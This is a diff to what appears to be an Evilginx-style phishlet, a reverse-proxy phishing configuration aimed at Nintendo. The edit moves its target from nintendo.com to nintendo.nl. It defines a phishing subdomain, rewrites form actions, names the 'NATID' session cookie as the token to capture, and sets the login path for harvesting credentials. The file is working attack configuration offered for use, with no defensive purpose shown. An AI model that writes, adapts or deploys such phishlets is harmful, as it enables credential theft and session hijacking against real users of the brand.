@@ -1,13 +1,13 @@
 author: '@Jerp'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'nintendo', orig_sub: 'www', domain: 'nintendo.com', session: true, is_landing: true}
+  - {phish_sub: 'nintendo', orig_sub: 'www', domain: 'nintendo.nl', session: true, is_landing: true}
 
 sub_filters:
-  - {triggers_on: 'nintendo.com', orig_sub: 'www', domain: 'nintendo.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'nintendo.com', orig_sub: 'www', domain: 'nintendo.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
 
 auth_tokens:
-  - domain: 'www.nintendo.com'
+  - domain: 'www.nintendo.nl'
     keys: ['NATID']
 
 auth_urls:   
@@ -23,5 +23,5 @@ credentials:
     type: 'post'
 
 login:
-  domain: 'www.nintendo.com'
-  path: '/login'
+  domain: 'www.nintendo.nl'
+  path: '/'
